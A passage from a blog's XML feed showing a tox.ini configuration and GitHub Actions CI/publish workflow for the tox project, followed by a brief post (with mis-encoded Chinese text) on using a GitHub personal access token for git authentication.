class="hljs-number">3.12</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv]</span></span><span class="line"><span class="hljs-attr">description</span> = run the tests with pytest under &#123;basepython&#125;</span><span class="line"><span class="hljs-attr">passenv</span> =</span><span class="line">    CURL_CA_BUNDLE</span><span class="line">    PIP_CACHE_DIR</span><span class="line">    PYTEST_*</span><span class="line">    REQUESTS_CA_BUNDLE</span><span class="line">    SSL_CERT_FILE</span><span class="line"><span class="hljs-attr">setenv</span> =</span><span class="line">    <span class="hljs-attr">COVERAGE_FILE</span> = &#123;env:COVERAGE_FILE:&#123;toxworkdir&#125;/.coverage.&#123;envname&#125;&#125;</span><span class="line">    <span class="hljs-attr">PIP_DISABLE_PIP_VERSION_CHECK</span> = <span class="hljs-number">1</span></span><span class="line">    &#123;py27,pypy&#125;: <span class="hljs-attr">PYTHONWARNINGS</span> = ignore:DEPRECATION::pip._internal.cli.base_command</span><span class="line"><span class="hljs-attr">extras</span> =</span><span class="line">    testing</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    pytest \</span><span class="line">      --cov &quot;&#123;envsitepackagesdir&#125;/tox&quot; \</span><span class="line">      --cov-config &quot;&#123;toxinidir&#125;/tox.ini&quot; \</span><span class="line">      --junitxml &#123;toxworkdir&#125;/junit.&#123;envname&#125;.xml \</span><span class="line">      &#123;posargs:.&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:fix_lint]</span></span><span class="line"><span class="hljs-attr">description</span> = format the code base to adhere to our styles, and complain about what we cannot do automatically</span><span class="line"><span class="hljs-attr">passenv</span> =</span><span class="line">    &#123;<span class="hljs-section">[testenv]</span>passenv&#125;</span><span class="line">    PRE_COMMIT_HOME</span><span class="line">    PROGRAMDATA</span><span class="line"><span class="hljs-attr">basepython</span> = python3.<span class="hljs-number">10</span></span><span class="line"><span class="hljs-attr">skip_install</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">deps</span> =</span><span class="line">    pre-commit&gt;=2.16</span><span class="line"><span class="hljs-attr">extras</span> =</span><span class="line">    lint</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    pre-commit run --all-files --show-diff-on-failure &#123;posargs&#125;</span><span class="line">    python -c &#x27;import pathlib<span class="hljs-comment">; print(&quot;hint: run \&#123;\&#125; install to add checks as pre-commit hook&quot;.format(pathlib.Path(r&quot;&#123;envdir&#125;&quot;) / &quot;bin&quot; / &quot;pre-commit&quot;))&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:coverage]</span></span><span class="line"><span class="hljs-attr">description</span> = [run locally after tests]: combine coverage data and create report<span class="hljs-comment">;</span></span><span class="line">    generates a diff coverage against origin/master (can be changed by setting DIFF_AGAINST env var)</span><span class="line"><span class="hljs-attr">passenv</span> =</span><span class="line">    &#123;<span class="hljs-section">[testenv]</span>passenv&#125;</span><span class="line">    DIFF_AGAINST</span><span class="line"><span class="hljs-attr">setenv</span> =</span><span class="line">    <span class="hljs-attr">COVERAGE_FILE</span> = &#123;toxworkdir&#125;/.coverage</span><span class="line"><span class="hljs-attr">skip_install</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">deps</span> =</span><span class="line">    coverage&gt;=6.2</span><span class="line">    diff-cover&gt;=6.4</span><span class="line"><span class="hljs-attr">parallel_show_output</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    coverage combine</span><span class="line">    coverage report -m</span><span class="line">    coverage xml -o &#123;toxworkdir&#125;/coverage.xml</span><span class="line">    coverage html -d &#123;toxworkdir&#125;/htmlcov</span><span class="line">    diff-cover --compare-branch &#123;env:DIFF_AGAINST:origin/master&#125; &#123;toxworkdir&#125;/coverage.xml</span><span class="line"><span class="hljs-attr">depends</span> = py27, py35, py36, py37, py38, py39, py310, pypy, pypy3</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:docs]</span></span><span class="line"><span class="hljs-attr">description</span> = invoke sphinx-build to build the HTML docs</span><span class="line"><span class="hljs-attr">basepython</span> = python3.<span class="hljs-number">10</span></span><span class="line"><span class="hljs-attr">extras</span> =</span><span class="line">    docs</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    sphinx-build -d &quot;&#123;toxworkdir&#125;/docs_doctree&quot; docs &quot;&#123;toxworkdir&#125;/docs_out&quot; --color -W --keep-going -n -bhtml &#123;posargs&#125;</span><span class="line">    python -c &#x27;import pathlib<span class="hljs-comment">; print(&quot;documentation available under file://\&#123;0\&#125;&quot;.format(pathlib.Path(r&quot;&#123;toxworkdir&#125;&quot;) / &quot;docs_out&quot; / &quot;index.html&quot;))&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:readme]</span></span><span class="line"><span class="hljs-attr">description</span> = check that the long description is valid</span><span class="line"><span class="hljs-attr">basepython</span> = python3.<span class="hljs-number">9</span></span><span class="line"><span class="hljs-attr">skip_install</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">deps</span> =</span><span class="line">    twine&gt;=3.7.1</span><span class="line"><span class="hljs-attr">extras</span> =</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    pip wheel -w &#123;envtmpdir&#125;/build --no-deps .</span><span class="line">    twine check &#123;envtmpdir&#125;/build/*</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:exit_code]</span></span><span class="line"><span class="hljs-attr">description</span> = commands with several exit codes</span><span class="line"><span class="hljs-attr">basepython</span> = python3.<span class="hljs-number">10</span></span><span class="line"><span class="hljs-attr">skip_install</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    python3.10 -c &quot;import sys<span class="hljs-comment">; sys.exit(139)&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:X]</span></span><span class="line"><span class="hljs-attr">description</span> = print the positional arguments passed in with echo</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    echo &#123;posargs&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:release]</span></span><span class="line"><span class="hljs-attr">description</span> = do a release, required posarg of the version number</span><span class="line"><span class="hljs-attr">passenv</span> =</span><span class="line">    *</span><span class="line"><span class="hljs-attr">basepython</span> = python3.<span class="hljs-number">10</span></span><span class="line"><span class="hljs-attr">deps</span> =</span><span class="line">    gitpython&gt;=3.1.24</span><span class="line">    packaging&gt;=21.3</span><span class="line">    towncrier&gt;=21.3</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    python &#123;toxinidir&#125;/tasks/release.py --version &#123;posargs&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:dev]</span></span><span class="line"><span class="hljs-attr">description</span> = dev environment with all deps at &#123;envdir&#125;</span><span class="line"><span class="hljs-attr">usedevelop</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">deps</span> =</span><span class="line">    &#123;<span class="hljs-section">[testenv:release]</span>deps&#125;</span><span class="line"><span class="hljs-attr">extras</span> =</span><span class="line">    docs</span><span class="line">    testing</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    python -m pip list <span class="hljs-attr">--format</span>=columns</span><span class="line">    python -c &quot;print(r&#x27;&#123;envpython&#125;&#x27;)&quot;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[flake8]</span></span><span class="line"><span class="hljs-attr">max-complexity</span> = <span class="hljs-number">22</span></span><span class="line"><span class="hljs-attr">max-line-length</span> = <span class="hljs-number">99</span></span><span class="line"><span class="hljs-attr">ignore</span> = E203, W503, C901, E402, B011</span><span class="line"></br></span><span class="line"><span class="hljs-section">[pep8]</span></span><span class="line"><span class="hljs-attr">max-line-length</span> = <span class="hljs-number">99</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[coverage:run]</span></span><span class="line"><span class="hljs-attr">branch</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">parallel</span> = <span class="hljs-literal">true</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[coverage:report]</span></span><span class="line"><span class="hljs-attr">skip_covered</span> = <span class="hljs-literal">True</span></span><span class="line"><span class="hljs-attr">show_missing</span> = <span class="hljs-literal">True</span></span><span class="line"><span class="hljs-attr">exclude_lines</span> =</span><span class="line">    \<span class="hljs-comment">#\s*pragma: no cover</span></span><span class="line">    ^\s*raise AssertionError\b</span><span class="line">    ^\s*raise NotImplementedError\b</span><span class="line">    ^\s*return NotImplemented\b</span><span class="line">    ^\s*raise$</span><span class="line">    ^if <span class="hljs-attr">__name__</span> == [<span class="hljs-string">&#x27;&quot;]__main__[&#x27;</span><span class="hljs-string">&quot;]:$</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">[coverage:paths]</span></span><span class="line"><span class="hljs-string">source = src/tox</span></span><span class="line"><span class="hljs-string">    */.tox/*/lib/python*/site-packages/tox</span></span><span class="line"><span class="hljs-string">    */.tox/pypy*/site-packages/tox</span></span><span class="line"><span class="hljs-string">    */.tox\*\Lib\site-packages\tox</span></span><span class="line"><span class="hljs-string">    */src/tox</span></span><span class="line"><span class="hljs-string">    *\src\tox</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">[pytest]</span></span><span class="line"><span class="hljs-string">addopts = -ra --showlocals --no-success-flaky-report</span></span><span class="line"><span class="hljs-string">testpaths = tests</span></span><span class="line"><span class="hljs-string">xfail_strict = True</span></span><span class="line"><span class="hljs-string">markers =</span></span><span class="line"><span class="hljs-string">    git</span></span><span class="line"><span class="hljs-string">    network</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">[isort]</span></span><span class="line"><span class="hljs-string">profile = black</span></span><span class="line"><span class="hljs-string">line_length = 99</span></span><span class="line"><span class="hljs-string">known_first_party = tox,tests</span></span></code></pre></div></div><p>Action:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">check</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span> [<span class="hljs-string">master</span>, <span class="hljs-string">&#x27;test-me-*&#x27;</span>]</span><span class="line">    <span class="hljs-attr">tags:</span></span><span class="line">  <span class="hljs-attr">pull_request:</span></span><span class="line">  <span class="hljs-attr">schedule:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">cron:</span> <span class="hljs-string">&quot;0 8 * * *&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">concurrency:</span></span><span class="line">  <span class="hljs-attr">group:</span> <span class="hljs-string">check-$&#123;&#123;</span> <span class="hljs-string">github.ref</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">  <span class="hljs-attr">cancel-in-progress:</span> <span class="hljs-literal">true</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">test:</span></span><span class="line">    <span class="hljs-attr">name:</span> <span class="hljs-string">test</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.py</span> <span class="hljs-string">&#125;&#125;</span> <span class="hljs-bullet">-</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.os</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.os</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">    <span class="hljs-attr">strategy:</span></span><span class="line">      <span class="hljs-attr">fail-fast:</span> <span class="hljs-literal">false</span></span><span class="line">      <span class="hljs-attr">matrix:</span></span><span class="line">        <span class="hljs-attr">py:</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3.10&quot;</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;pypy-3.7-v7.3.7&quot;</span>  <span class="hljs-comment"># ahead to start it earlier because takes longer</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;pypy-2.7-v7.3.6&quot;</span>  <span class="hljs-comment"># ahead to start it earlier because takes longer</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3.9&quot;</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3.8&quot;</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3.7&quot;</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3.6&quot;</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3.5&quot;</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;2.7&quot;</span></span><span class="line">        <span class="hljs-attr">os:</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">ubuntu-20.04</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">windows-2022</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">macos-10.15</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">python</span> <span class="hljs-string">for</span> <span class="hljs-string">tox</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">python-version:</span> <span class="hljs-string">&quot;3.10&quot;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">tox</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">tox</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">python</span> <span class="hljs-string">for</span> <span class="hljs-string">test</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.py</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">python-version:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.py</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Pick</span> <span class="hljs-string">environment</span> <span class="hljs-string">to</span> <span class="hljs-string">run</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">          import codecs</span></span><span class="line"><span class="hljs-string">          import os</span></span><span class="line"><span class="hljs-string">          import platform</span></span><span class="line"><span class="hljs-string">          import sys</span></span><span class="line"><span class="hljs-string">          cpy = platform.python_implementation() == &quot;CPython&quot;</span></span><span class="line"><span class="hljs-string">          base =(&quot;&#123;&#125;&#123;&#125;&#123;&#125;&quot; if cpy else &quot;&#123;&#125;&#123;&#125;&quot;).format(&quot;py&quot; if cpy else &quot;pypy&quot;, *sys.version_info[0:2])</span></span><span class="line"><span class="hljs-string">          env = &quot;TOXENV=&#123;&#125;\n&quot;.format(base)</span></span><span class="line"><span class="hljs-string">          print(&quot;Picked:\n&#123;&#125;for&#123;&#125;&quot;.format(env, sys.version))</span></span><span class="line"><span class="hljs-string">          with codecs.open(os.environ[&quot;GITHUB_ENV&quot;], &quot;a&quot;, &quot;utf-8&quot;) as file_handler:</span></span><span class="line"><span class="hljs-string">               file_handler.write(env)</span></span><span class="line"><span class="hljs-string"></span>        <span class="hljs-attr">shell:</span> <span class="hljs-string">python</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">test</span> <span class="hljs-string">suite</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">tox</span> <span class="hljs-string">-vv</span> <span class="hljs-string">--notest</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">test</span> <span class="hljs-string">suite</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">tox</span> <span class="hljs-string">--skip-pkg-install</span></span><span class="line">        <span class="hljs-attr">env:</span></span><span class="line">          <span class="hljs-attr">PYTEST_ADDOPTS:</span> <span class="hljs-string">&quot;-vv --durations=20&quot;</span></span><span class="line">          <span class="hljs-attr">CI_RUN:</span> <span class="hljs-string">&quot;yes&quot;</span></span><span class="line">          <span class="hljs-attr">DIFF_AGAINST:</span> <span class="hljs-string">HEAD</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Rename</span> <span class="hljs-string">coverage</span> <span class="hljs-string">report</span> <span class="hljs-string">file</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">import</span> <span class="hljs-string">os;</span> <span class="hljs-string">import</span> <span class="hljs-string">sys;</span> <span class="hljs-string">os.rename(&quot;.tox/.coverage.&#123;&#125;&quot;.format(os.environ[&#x27;TOXENV&#x27;]),</span> <span class="hljs-string">&quot;.tox/.coverage.&#123;&#125;-&#123;&#125;.format(os.environ[&#x27;TOXENV&#x27;], sys.platform)&quot;</span><span class="hljs-string">)</span></span><span class="line">        <span class="hljs-attr">shell:</span> <span class="hljs-string">python</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">coverage</span> <span class="hljs-string">data</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-artifact@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">name:</span> <span class="hljs-string">coverage-data</span></span><span class="line">          <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;.tox/.coverage.*&quot;</span></span><span class="line"></br></span><span class="line">  <span class="hljs-attr">coverage:</span></span><span class="line">    <span class="hljs-attr">name:</span> <span class="hljs-string">Combine</span> <span class="hljs-string">coverage</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">needs:</span> <span class="hljs-string">test</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">python-version:</span> <span class="hljs-string">&quot;3.10&quot;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">tox</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">tox</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">coverage</span> <span class="hljs-string">tool</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">tox</span> <span class="hljs-string">-e</span> <span class="hljs-string">coverage</span> <span class="hljs-string">--notest</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">package</span> <span class="hljs-string">builder</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">build</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">package</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">pyproject-build</span> <span class="hljs-string">--wheel</span> <span class="hljs-string">.</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Download</span> <span class="hljs-string">coverage</span> <span class="hljs-string">data</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/download-artifact@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">name:</span> <span class="hljs-string">coverage-data</span></span><span class="line">          <span class="hljs-attr">path:</span> <span class="hljs-string">.tox</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Combine</span> <span class="hljs-string">and</span> <span class="hljs-string">report</span> <span class="hljs-string">coverage</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">tox</span> <span class="hljs-string">-e</span> <span class="hljs-string">coverage</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Upload</span> <span class="hljs-string">HTML</span> <span class="hljs-string">report</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-artifact@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">name:</span> <span class="hljs-string">html-report</span></span><span class="line">          <span class="hljs-attr">path:</span> <span class="hljs-string">.tox/htmlcov</span></span><span class="line"></br></span><span class="line">  <span class="hljs-attr">check:</span></span><span class="line">    <span class="hljs-attr">name:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.tox_env</span> <span class="hljs-string">&#125;&#125;</span> <span class="hljs-bullet">-</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.os</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.os</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">    <span class="hljs-attr">strategy:</span></span><span class="line">      <span class="hljs-attr">fail-fast:</span> <span class="hljs-literal">false</span></span><span class="line">      <span class="hljs-attr">matrix:</span></span><span class="line">        <span class="hljs-attr">os:</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">ubuntu-20.04</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">windows-2022</span></span><span class="line">        <span class="hljs-attr">tox_env:</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">dev</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">docs</span></span><span class="line">          <span class="hljs-bullet">-</span> <span class="hljs-string">readme</span></span><span class="line">        <span class="hljs-attr">exclude:</span></span><span class="line">          <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">os:</span> <span class="hljs-string">windows-2022</span>, <span class="hljs-attr">tox_env:</span> <span class="hljs-string">readme</span> &#125;</span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span> <span class="hljs-string">&quot;3.10&quot;</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">python-version:</span> <span class="hljs-string">&quot;3.10&quot;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">tox</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">tox</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">test</span> <span class="hljs-string">suite</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">tox</span> <span class="hljs-string">-vv</span> <span class="hljs-string">--notest</span> <span class="hljs-string">-e</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.tox_env</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">test</span> <span class="hljs-string">suite</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">tox</span> <span class="hljs-string">--skip-pkg-install</span> <span class="hljs-string">-e</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.tox_env</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line"></br></span><span class="line">  <span class="hljs-attr">publish:</span></span><span class="line">    <span class="hljs-attr">if:</span> <span class="hljs-string">github.event_name</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;push&#x27;</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">startsWith(github.ref,</span> <span class="hljs-string">&#x27;refs/tags&#x27;</span><span class="hljs-string">)</span></span><span class="line">    <span class="hljs-attr">needs:</span> [ <span class="hljs-string">check</span>, <span class="hljs-string">coverage</span> ]</span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-20.04</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">python</span> <span class="hljs-string">to</span> <span class="hljs-string">build</span> <span class="hljs-string">package</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">python-version:</span> <span class="hljs-string">&quot;3.10&quot;</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">build</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">build</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">sdist</span> <span class="hljs-string">and</span> <span class="hljs-string">wheel</span></span><span class="line">        <span class="hljs-attr">run:</span> <span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">build</span> <span class="hljs-string">-s</span> <span class="hljs-string">-w</span> <span class="hljs-string">.</span> <span class="hljs-string">-o</span> <span class="hljs-string">dist</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Publish</span> <span class="hljs-string">to</span> <span class="hljs-string">PyPi</span></span><span class="line">        <span class="hljs-attr">uses:</span> <span class="hljs-string">pypa/gh-action-pypi-publish@master</span></span><span class="line">        <span class="hljs-attr">with:</span></span><span class="line">          <span class="hljs-attr">skip_existing:</span> <span class="hljs-literal">true</span></span><span class="line">          <span class="hljs-attr">user:</span> <span class="hljs-string">__token__</span></span><span class="line">          <span class="hljs-attr">password:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.pypi_password</span> <span class="hljs-string">&#125;&#125;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github è´¦å·ç™»å½•é—®é¢˜</title>
      <link href="/2022/06/21/github-%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98/"/>
      <url>/2022/06/21/github-%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>å½“ä½¿ç”¨gitçš„æ—¶å€™é‡åˆ°</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-basic codeBlockLines"><span class="line"><span class="hljs-comment">remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.</span></span></code></pre></div></div><p>è¿™æ—¶å€™è¾“å…¥çš„ä¸åº”è¯¥æ˜¯ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œæ˜¯ç”¨æˆ·åå’Œ<code>personal access token</code></p><p>åœ¨ Github -&gt; Settings -&gt; Developer settings -&gt; Personal access tokens åˆ›å»ºæˆ–è€…é‡æ–°ç”Ÿæˆä¸€ä¸ªtoken</p><p>æŠŠè¿™ä¸ªtokenç”¨ä½œå¯†ç </p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
